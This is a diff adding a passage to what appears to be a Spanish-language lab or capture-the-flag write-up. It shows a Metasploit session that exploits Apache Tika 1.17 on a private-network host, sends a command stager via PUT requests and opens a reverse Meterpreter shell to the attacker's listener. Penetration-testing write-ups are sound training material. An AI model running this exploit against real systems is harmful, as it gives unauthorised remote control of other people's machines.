@@ -118,6 +118,24 @@ Description:
 
 funciona, vamos a usarlo : 
 
+msf exploit(windows/http/apache_tika_jp2_jscript) > set RHOSTS 10.67.189.47
+RHOSTS => 10.67.189.47
+msf exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
+RPORT => 61777
+msf exploit(windows/http/apache_tika_jp2_jscript) > set LHOST 192.168.138.111
+LHOST => 192.168.138.111
+msf exploit(windows/http/apache_tika_jp2_jscript) > exploit
+[*] Started reverse TCP handler on 192.168.138.111:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. Target is vulnerable based on version: 1.17
+[*] Sending PUT request to 10.67.189.47:61777/meta
+[*] Command Stager progress -  82.46% done (7999/9701 bytes)
+[*] Sending PUT request to 10.67.189.47:61777/meta
+[*] Command Stager progress - 100.00% done (9701/9701 bytes)
+[*] Sending stage (199238 bytes) to 10.67.189.47
+[*] Meterpreter session 1 opened (192.168.138.111:4444 -> 10.67.189.47:49997) at 2026-07-04 19:19:41 -0500
+
+meterpreter > 
 
 
 
